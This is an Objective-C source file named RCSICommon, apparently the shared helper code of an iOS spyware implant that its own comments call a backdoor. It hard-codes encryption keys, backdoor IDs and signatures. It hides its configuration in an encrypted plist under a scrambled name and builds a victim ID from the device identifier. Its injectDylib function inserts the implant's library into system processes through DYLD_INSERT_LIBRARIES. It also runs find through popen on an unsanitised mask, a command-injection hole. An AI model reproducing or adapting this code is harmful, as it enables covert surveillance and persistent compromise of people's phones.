/*
 * RCSiOS - RCSICommon
 *  A common place for shit of (id) == (generalization FTW)
 *
 *
 * Created on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <CommonCrypto/CommonDigest.h>
#import <UIKit/UIDevice.h>
#import <sqlite3.h>

#import "NSData+SHA1.h"
#import "NSMutableData+AES128.h"
#import "RCSIEncryption.h"
#import "RCSICommon.h"

//#define DEBUG

FILE *logFD = NULL;

#ifndef DEV_MODE
char  gLogAesKey[]      = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // default
#else
char  gLogAesKey[]      = "9797DE1BD45444B171B9D6CCE6E0CB45"; // 11 Dubai
#endif

#ifndef DEV_MODE
char  gConfAesKey[]     = "Adf5V57gQtyi90wUhpb8Neg56756j87R"; // default
#else
char  gConfAesKey[]     = "2A61DC73B553402F804FB0D0036C632F"; //
#endif

// Instance ID (20 bytes) unique per backdoor/user
char gInstanceID[]      = "37E63B54CDFB1EA1E99BCD5CD9A72DD00272BD75"; // generated

// Backdoor ID (16 bytes) (NULL terminated)
#ifndef DEV_MODE
char gBackdoorID[]      = "av3pVck1gb4eR2d8";
#else
char gBackdoorID[]      = "RCS_0000000011"; // 11 Dubai
#endif

// Challenge Key aka signature
#ifndef DEV_MODE
char gBackdoorSignature[]       = "f7Hk0f5usd04apdvqw13F5ed25soV5eD"; //default
#else
char gBackdoorSignature[]       = "MPMxXyD6fUfaWaIOia4X+koq7BtXXj3o"; 
#endif

// Demo marker: se la stringa e' uguale a "hxVtdxJ/Z8LvK3ULSnKRUmLE"
// allora e' in demo altrimenti no demo.
char gDemoMarker[] = "hxVtdxJ/Z8LvK3ULSnKRUmLE";

// Configuration Filename encrypted within the first byte of gBackdoorSignature
char gConfName[]    = "c3mdX053du1YJ541vqWILrc4Ff71pViL";

BOOL gIsDemoMode    = FALSE;
BOOL gAgentCrisis   = NO;
BOOL gCameraActive  = NO;

NSString *gDylibName                = nil;
NSString *gBackdoorName             = nil;
NSString *gBackdoorUpdateName       = nil;
NSString *gConfigurationName        = nil;
NSString *gConfigurationUpdateName  = nil;
NSString *gCurrInstanceIDFileName   = nil;
NSString *gCurrInstanceID           = nil;
NSData   *gSessionKey               = nil;

// OS version
u_int gOSMajor  = 0;
u_int gOSMinor  = 0;
u_int gOSBugFix = 0;

// Core Version
u_int gVersion      = 2012063001;

int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
{
  int             err;
  kinfo_proc      *result;
  bool            done;
  static const int name[] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
  size_t          length;
  
  *procCount = 0;
  
  result = NULL;
  done = false;
  
  do
    {     
      // Call sysctl with a NULL buffer to get proper length
      length = 0;
      err = sysctl ((int *)name, (sizeof (name) / sizeof (*name)) - 1, NULL, &length, NULL, 0);
      if (err == -1)
        err = errno;
      
      // Now, proper length is obtained
      if (err == 0)
        {
          result = (kinfo_proc *)malloc (length);
          if (result == NULL)
            err = ENOMEM;   // not allocated
        }
      
      if (err == 0)
        {
          err = sysctl ((int *)name, (sizeof (name) / sizeof (*name)) - 1, result, &length, NULL, 0);
          if (err == -1)
            err = errno;
          
          if (err == 0)
            done = true;
          else if (err == ENOMEM)
            {
              free(result);
              result = NULL;
              err = 0;
            }
        }
    }
  while (err == 0 && !done);
  
  // Clean up and establish post condition  
  if (err != 0 && result != NULL)
    {
      free (result);
      result = NULL;
    }
  
  *procList = result; // will return the result as procList
  if (err == 0)
    *procCount = length / sizeof (kinfo_proc);
  
  return err;
}  

NSArray *obtainProcessList ()
{
  int i;
  kinfo_proc *allProcs = 0;
  size_t numProcs;
  NSString *procName;
  NSMutableArray *processList;
  
  int err =  getBSDProcessList (&allProcs, &numProcs);
  if (err)
    return nil;
  
  processList = [NSMutableArray arrayWithCapacity: numProcs];
  
  for (i = 0; i < numProcs; i++)
    {
      procName = [NSString stringWithFormat: @"%s", allProcs[i].kp_proc.p_comm];
      [processList addObject: [procName lowercaseString]];
    }
  
  free (allProcs);
  return processList;
}

BOOL findProcessWithName (NSString *aProcess)
{
  NSArray *processList = obtainProcessList();
  
  [processList retain];
  
  for (NSString *currentProcess in processList)
    {
      if (matchPattern([currentProcess UTF8String], [[aProcess lowercaseString] UTF8String]))
        {
          [processList release];
          return YES;
        }
    }
  
  [processList release];
  
  return NO;
}

pid_t getPidByProcessName (NSString *aProcess)
{
  int i;
  pid_t pid = -1;
  
  kinfo_proc *allProcs = NULL;
  size_t numProcs;
  NSString *procName;
  
  int err =  getBSDProcessList (&allProcs, &numProcs);

  if (err)
    return pid;
  
  for (i = 0; i < numProcs; i++)
    {
      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
      
      procName = [NSString stringWithFormat: @"%s", allProcs[i].kp_proc.p_comm];
      
      if ([procName isEqualToString: aProcess] == YES)
        {
          pid = allProcs[i].kp_proc.p_pid;
          [pool release];
          break;
        }
    
      [pool release];
    }
  
  free (allProcs);
  
  return pid;
}

BOOL isAddressOnLan (struct in_addr firstIp,
                     struct in_addr secondIp)
{
  struct ifaddrs *iface, *ifacesHead;
  
  //
  // Get Interfaces information
  //
  if (getifaddrs (&ifacesHead) == 0)
    {
      for (iface = ifacesHead; iface != NULL; iface = iface->ifa_next)
        { 
          if (iface->ifa_addr == NULL || iface->ifa_addr->sa_family != AF_INET)
            continue;
          
          if ( (firstIp.s_addr & ((struct sockaddr_in *)iface->ifa_netmask)->sin_addr.s_addr) ==
              (secondIp.s_addr & ((struct sockaddr_in *)iface->ifa_netmask)->sin_addr.s_addr) )
            {
              freeifaddrs (ifacesHead);
              return TRUE;
            }
        }
      freeifaddrs (ifacesHead);
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Error while querying network interfaces");
#endif
    }
  
  return FALSE;
}

BOOL isAddressAlreadyDetected (NSString *ipAddress,
                               int aPort,
                               NSString *netMask,
                               NSMutableArray *ipDetectedList)
{
  NSEnumerator *enumerator = [ipDetectedList objectEnumerator];
  id anObject;
  
  while ((anObject = [enumerator nextObject]))
    { 
      if ([[anObject objectForKey: @"ip"] isEqualToString: ipAddress])
        {
          if ( (aPort == 0 ||
                [[anObject objectForKey: @"port"] intValue] == aPort) &&
               ([[anObject objectForKey: @"netmask"] isEqualToString: netMask]) )
            return TRUE;
        }
    }
  
  return FALSE;
}

BOOL compareIpAddress (struct in_addr firstIp,
                       struct in_addr secondIp,
                       u_long netMask)
{
  struct ifaddrs *iface, *ifacesHead;
  u_long ip1, ip2;
  
  //
  // Get Interfaces information
  //
  if (getifaddrs (&ifacesHead) == 0)
    {
      for (iface = ifacesHead; iface != NULL; iface = iface->ifa_next)
        { 
          if (iface->ifa_addr == NULL || iface->ifa_addr->sa_family != AF_INET)
            continue;
          
          ip1 = firstIp.s_addr & netMask;
          ip2 = secondIp.s_addr & netMask;
          
          if (ip1 == ip2)
            {
              freeifaddrs (ifacesHead);
              return TRUE;
            }
        }
      freeifaddrs (ifacesHead);
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Error while querying network interfaces");
#endif
    }
    
  return FALSE;
}

NSString *getHostname ()
{
  NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
  NSString *hostName          = [processInfo hostName];

  return hostName;
}

//
// Returns the serial number as a CFString.
// It is the caller's responsibility to release the returned CFString when done with it.
//
NSString *getSystemSerialNumber()
{

  NSString *id = [[UIDevice currentDevice] uniqueIdentifier];
  return id;
}

NSString *getCurrInstanceID()
{
  NSMutableString *_instanceID = nil;
  
  if (gCurrInstanceID != nil)
    return gCurrInstanceID;
  
  _instanceID = [[NSString alloc] initWithContentsOfFile: gCurrInstanceIDFileName 
                                                encoding: NSUTF8StringEncoding 
                                                   error: nil];
  if (_instanceID == nil)
    {
      NSString *serialNumber = getSystemSerialNumber();
      
      NSMutableString *tmpinstID = [[NSMutableString alloc] initWithString: (NSString *)serialNumber];
      
      NSString *userName = NSUserName();
      
      if (userName != nil)
        [tmpinstID appendString: userName];
      
      [tmpinstID writeToFile: gCurrInstanceIDFileName 
                  atomically: YES 
                    encoding: NSUTF8StringEncoding 
                       error: nil];
    
      _instanceID = [[NSString alloc] initWithString: tmpinstID];
    
      [tmpinstID release];
    }
  
  gCurrInstanceID = _instanceID;
  
  return gCurrInstanceID;
}

int matchPattern(const char *source, const char *pattern)
{
  for (;;)
    {
      if (!*pattern)
        return (!*source);
      
      if (*pattern == '*')
        {
          pattern++;
          
          if (!*pattern)
            return (1);
          
          if (*pattern != '?' && *pattern != '*')
            {
              for (; *source; source++)
                {
                if (*source == *pattern && matchPattern(source + 1, pattern + 1))
                  return (1);
                }
              
              return (0);
            }
          
          for (; *source; source++)
            {
              if (matchPattern(source, pattern))
                return (1);
            }
          
          return (0);
        }
      
      if (!*source)
        return (0);
      
      if (*pattern != '?' && *pattern != *source)
        return (0);
      
      source++;
      pattern++;
    }
}

NSArray *searchForProtoUpload(NSString *aFileMask)
{
  NSFileManager *_fileManager = [NSFileManager defaultManager];
  NSString *filePath          = [aFileMask stringByDeletingLastPathComponent];
  NSString *fileNameToMatch   = [aFileMask lastPathComponent];
  NSMutableArray *filesFound  = [[NSMutableArray alloc] init];
  
	BOOL isDir;
  int i;
  
	[_fileManager fileExistsAtPath: filePath
                     isDirectory: &isDir];
  
  if (isDir == TRUE)
    {
      NSArray *dirContent = [_fileManager contentsOfDirectoryAtPath: filePath
                                                              error: nil];
      
      int filesCount = [dirContent count];
      for (i = 0; i < filesCount; i++)
        {
          NSString *fileName = [dirContent objectAtIndex: i];
          
          if (matchPattern([fileName UTF8String],
                           [fileNameToMatch UTF8String]))
            {
              NSString *foundFilePath = [NSString stringWithFormat: @"%@/%@", filePath, fileName];
              [filesFound addObject: foundFilePath];
            }
        }
    }
  
  if ([filesFound count] > 0)
    {
      return [filesFound autorelease];
    }
  else
    {
      [filesFound release];
      
      return nil;
    }
}

NSArray *searchFile (NSString *aFileMask)
{
  FILE *fp;
  char path[1035];
  NSMutableArray *fileFound = [[NSMutableArray alloc] init];

#ifdef DEBUG
  NSLog(@"aFileMask: %@", [aFileMask dataUsingEncoding: NSUTF8StringEncoding]);
#endif
  
  NSString *commandString = [NSString stringWithFormat: @"/usr/bin/find %@", aFileMask];
  
  fp = popen ([commandString cStringUsingEncoding: NSUTF8StringEncoding], "r");
  
  if (fp == NULL)
    {
      printf("Failed to run command\n" );
      return nil;
    }
  
  while (fgets (path, sizeof (path) - 1, fp) != NULL)
    {
      NSString *tempPath = [[NSString stringWithCString: path
                                               encoding: NSUTF8StringEncoding]
                            stringByReplacingOccurrencesOfString: @"\n"
                                                      withString: @""];
#ifdef DEBUG
      NSLog(@"path: %@", tempPath);
#endif
      [fileFound addObject: tempPath ];
    }
#ifdef DEBUG
  NSLog(@"fileFound: %@", fileFound);
#endif
  pclose(fp);
  
  return fileFound;
}

#define RCS_PLIST     @"rcsiphone.plist"
#define RCS_PLIST_CLR @"rcsiphone_clr.plist"

NSMutableDictionary *openRcsPropertyFile()
{  
  NSMutableDictionary *retDict;
  NSString             *error = nil;
  NSPropertyListFormat format;
  int                  len;
  unsigned char        *buffer;
  NSRange              range;
  
  // Using the config aes key
  NSData *keyData = [NSData dataWithBytes: gConfAesKey
                                   length: CC_MD5_DIGEST_LENGTH];
  
  RCSIEncryption *rcsEnc = [[RCSIEncryption alloc] initWithKey: keyData];
  NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
  [rcsEnc release];
  
  NSString *pFilePath = [[NSBundle mainBundle] bundlePath];
  NSString *pFileName = [pFilePath stringByAppendingPathComponent: sFileName];
  
  if (![[NSFileManager defaultManager] fileExistsAtPath: pFileName])
    return nil;
  
  // The enc plist
  NSData *pListData = [[NSFileManager defaultManager] contentsAtPath: pFileName];
  
  // Space for enc data
  NSMutableData *tempData = [[NSMutableData alloc] initWithLength: [pListData length] - sizeof(int)];
  buffer = (unsigned char *)[tempData bytes];
  
  // Extract the unpadded length
  range.location = sizeof(int);
  range.length   = [pListData length] - sizeof(int);
  [pListData getBytes: &len length: sizeof(int)];
  
  // Extract the prop list
  [pListData getBytes: (void *)buffer range: range];
  NSMutableData *ePropData = [NSMutableData dataWithBytes: buffer length: range.length];
  
  [tempData release];
  
  // Decrypt it
  if ([ePropData decryptWithKey: keyData] != kCCSuccess)
    {
      return nil;
    }
  // Save unpadded len bytes
  NSData *dPlistData = [NSData dataWithBytes: [ePropData bytes] length: len];
    
  // Create the plist dict
  retDict = (NSMutableDictionary *) [NSPropertyListSerialization propertyListFromData: dPlistData 
                                                                     mutabilityOption: NSPropertyListMutableContainers
                                                                               format: &format
                                                                     errorDescription: &error];
  return retDict;
}

id rcsPropertyWithName(NSString *name)
{ 
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id dict = nil;
   
  NSDictionary *temp = openRcsPropertyFile();  
  
  if (temp == nil)
    {
      [pool release];
      return nil;
    }
  
  dict = (id)[[temp objectForKey: name] retain];
  
  [pool release];
  
  return dict;
}

BOOL setRcsPropertyWithName(NSString *name, NSDictionary *dictionary)
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSString      *error = nil;
  NSRange       range;
  NSMutableData *propData;
  
  // Try to open existing plist
  NSMutableDictionary *temp = openRcsPropertyFile();  
  
  if (temp == nil)
    {
      temp = (NSMutableDictionary *) dictionary;
    }
  else 
    {
      if ([temp objectForKey: name] != nil)
        {
          [temp removeObjectForKey: name];
          [temp setObject: [dictionary objectForKey: name] forKey: name];
        }
      else 
        {
          [temp addEntriesFromDictionary: dictionary];
        }
    }

  NSData *pListData = [NSPropertyListSerialization dataFromPropertyList: temp
                                                                 format: NSPropertyListXMLFormat_v1_0
                                                       errorDescription: &error];

  NSData *keyData = [NSData dataWithBytes: gConfAesKey
                                   length: CC_MD5_DIGEST_LENGTH];

  // Scrambled name
  RCSIEncryption *rcsEnc = [[RCSIEncryption alloc] initWithKey: keyData];
  NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
  [rcsEnc release];

  NSString *pFilePath = [[NSBundle mainBundle] bundlePath];
  NSString *pFileName = [pFilePath stringByAppendingPathComponent: sFileName];

  // Unpadded length
  int len = [pListData length];

  // Try the encryption
  if ([((NSMutableData *)pListData) encryptWithKey: keyData] == kCCSuccess)
    {
      // init the data with enc plist + (int)len
      propData = [[NSMutableData alloc] initWithCapacity: sizeof(int) + [pListData length]];
    
      // write down the unpadded len
      range.location = 0;
      range.length = sizeof(int);
      [propData replaceBytesInRange: range withBytes: (const void *) &len];
    
      // and the encrypted prop list 
      range.location = sizeof(int);
      range.length = [pListData length];
      [propData replaceBytesInRange: range withBytes: [pListData bytes]];

      [propData writeToFile: pFileName atomically: YES];
      
      [propData release];
    }
  
  [pool release];
  
  return YES;
}

BOOL injectDylib(NSString *sbPathname)
{
  NSString *errorDesc = nil;
  NSString *dylibPathname = [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
  
  NSData *sbData = [[NSFileManager defaultManager] contentsAtPath: sbPathname];
  
  if (sbData == nil)
    {
      return NO;
    }
  
  NSMutableDictionary *sbDict = 
  (NSMutableDictionary *)[NSPropertyListSerialization propertyListFromData: sbData 
                                                          mutabilityOption: NSPropertyListMutableContainersAndLeaves 
                                                                    format: nil  
                                                          errorDescription: &errorDesc];
  
  if (sbDict == nil)
    {
      return NO;
    }
  
  NSDictionary *dylibDict  = [[NSDictionary alloc] initWithObjectsAndKeys: 
                              dylibPathname, @"DYLD_INSERT_LIBRARIES", nil];
  
  NSMutableDictionary *sbEnvDict = (NSMutableDictionary *)[sbDict objectForKey: @"EnvironmentVariables"];
  
  if (sbEnvDict == nil) 
    {
      // No entry...
      NSDictionary *envVarDict = [[NSDictionary alloc] initWithObjectsAndKeys: 
                                  dylibDict, @"EnvironmentVariables", nil];
      
      [sbDict addEntriesFromDictionary: envVarDict];
      
      [envVarDict release];
      
    }
  else 
    {
      NSString *envObjOut = nil;
      NSString *envObjIn  = (NSString *) [sbEnvDict objectForKey: @"DYLD_INSERT_LIBRARIES"];
      
      if (envObjIn == nil) 
        {
          [sbEnvDict addEntriesFromDictionary: dylibDict];
        }
      else 
        {
          NSRange sbRange;
          
          // Check if already present
          sbRange = [envObjIn rangeOfString: gDylibName options: NSCaseInsensitiveSearch];
        
          if (sbRange.location == NSNotFound)
            {
              envObjOut = [[NSString alloc] initWithFormat: @"%@:%@", envObjIn, dylibPathname];
        
              [sbEnvDict setObject: envObjOut forKey: @"DYLD_INSERT_LIBRARIES"];
            }
        }
      
      [envObjOut release];
    }
  
  [dylibDict release];
  
  NSData *sbDataOut = [NSPropertyListSerialization dataFromPropertyList: sbDict 
                                                                 format: NSPropertyListBinaryFormat_v1_0
                                                       errorDescription: &errorDesc];
  
  [sbDataOut writeToFile: sbPathname
              atomically: YES];
  [dylibPathname release];
  
  return YES;
}

BOOL removeDylibFromPlist(NSString *sbPathname)
{
  NSString *dylibPathname = [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
  NSString *errorDesc = nil;
  
  NSData *sbData = [[NSFileManager defaultManager] contentsAtPath: sbPathname];
  
  if (sbData == nil)
    {
      return NO;
    }
  
  NSMutableDictionary *sbDict = 
  (NSMutableDictionary *)[NSPropertyListSerialization propertyListFromData: sbData 
                                                          mutabilityOption: NSPropertyListMutableContainersAndLeaves 
                                                                    format: nil  
                                                          errorDescription: &errorDesc];
  
  if (sbDict == nil)
    {
      return NO;
    }
  
  NSMutableDictionary *sbEnvDict = (NSMutableDictionary *)[sbDict objectForKey: @"EnvironmentVariables"];

  if (sbEnvDict != nil) 
    {
      NSMutableString *envObjOut = nil;
      NSString *envObjIn  = (NSString *)[sbEnvDict objectForKey: @"DYLD_INSERT_LIBRARIES"];
      
      if (envObjIn != nil) 
        {    
          NSRange dlRange = [envObjIn rangeOfString: dylibPathname];
          
          if (dlRange.location != NSNotFound &&
              dlRange.length   != 0) 
            {
              // check if we're alone
              if ([envObjIn length] == [dylibPathname length])
                {
                  // Yes alone remove the subdictionary
                  [sbDict removeObjectForKey: @"EnvironmentVariables"];
                }
              else 
                {
                  // delete the colon before or after...
                  if (dlRange.location != 0) 
                      dlRange.location--;
                
                  // remove the colon too
                  dlRange.length++;
                       
                  envObjOut = [[NSMutableString alloc] initWithString: envObjIn];
                  [envObjOut deleteCharactersInRange: dlRange];
                  [sbEnvDict setObject: envObjOut forKey: @"DYLD_INSERT_LIBRARIES"];

                  [envObjOut release];
                }
            }
        }
    
      NSData *sbDataOut = [NSPropertyListSerialization dataFromPropertyList: sbDict 
                                                                     format: NSPropertyListBinaryFormat_v1_0 
                                                           errorDescription: &errorDesc];
      
      [sbDataOut writeToFile: sbPathname atomically: YES];
    }
  
  return YES;
}

void getSystemVersion(u_int *major,
                      u_int *minor,
                      u_int *bugFix)
{
  NSString *currSysVer = [[UIDevice currentDevice] systemVersion];

  if ([currSysVer rangeOfString: @"."].location != NSNotFound)
    {
      NSArray *versions = [currSysVer componentsSeparatedByString: @"."];

      if ([versions count] > 2)
        {
          *bugFix = (u_int)[[versions objectAtIndex: 2] intValue];
        }

      *major  = (u_int)[[versions objectAtIndex: 0] intValue];
      *minor  = (u_int)[[versions objectAtIndex: 1] intValue];
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Error on sys ver (dot not found in string: %@)", currSysVer);
#endif
    }
}

NSMutableDictionary *
rcs_sqlite_get_row_dictionary(sqlite3_stmt *stmt)
{
  char field1[32];
  char field2[32];
  int i = 0;

  NSMutableDictionary *entry = [[NSMutableDictionary alloc] init];
  int cols = sqlite3_column_count(stmt);

  for (; i < cols; i++)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      strncpy(field1, (char *)sqlite3_column_name(stmt, i), 32);
      strncpy(field2, (char *)sqlite3_column_text(stmt, i), 32);

      NSString *colName = [[NSString alloc] initWithCString: field1
                                                   encoding: NSUTF8StringEncoding];
      NSString *colVal  = [[NSString alloc] initWithCString: field2
                                                   encoding: NSUTF8StringEncoding];

      [entry setObject: colVal
                forKey: colName];

      [colName release];
      [colVal release];
      [innerPool release];
    }

  return [entry autorelease];
}

NSMutableArray *
rcs_sqlite_do_select(sqlite3 *db, const char *stmt)
{
  int err;
  sqlite3_stmt *pStmt;

  sqlite3_prepare_v2(db, stmt, -1, &pStmt, 0); 
  NSMutableArray *results = [[NSMutableArray alloc] init];

  while ((err = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
      NSMutableDictionary *entry = rcs_sqlite_get_row_dictionary(pStmt);
      [results addObject: entry];
    }

  if (err != SQLITE_DONE)
    {
#ifdef DEBUG
      NSLog(@"Error on select: %s" sqlite3_errmsg((sqlite3 *)&db));
#endif
      return nil;
    }

  sqlite3_finalize(pStmt);

  if ([results count] == 0)
    return nil;

  return [results autorelease];
}

void checkAndRunDemoMode()
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // precalc sha1 of "hxVtdxJ/Z8LvK3ULSnKRUmLE
  char demoSha1[] = "\x31\xa2\x85\xaf\xb0\x43\xe7\xa0\x90\x49"
                    "\x94\xe1\x70\x07\xc8\x26\x3d\x45\x42\x73";
  
  NSMutableData *isDemoMarker = [[NSMutableData alloc] initWithBytes: demoSha1 length: 20];
  
  NSData *demoMode      = [[NSData alloc] initWithBytes: gDemoMarker length: 24];
  
  NSData *currDemoMode  = [demoMode sha1Hash];
  
  if ([currDemoMode isEqualToData: isDemoMarker] == TRUE) 
    {
      gIsDemoMode = YES;
      AudioServicesPlaySystemSound(1304);
      AudioServicesPlaySystemSound(kSystemSoundID_Vibrate);
      AudioServicesPlaySystemSound(kSystemSoundID_Vibrate);
    }    
  
  [demoMode release];
  [isDemoMarker release];
  [pool release];
}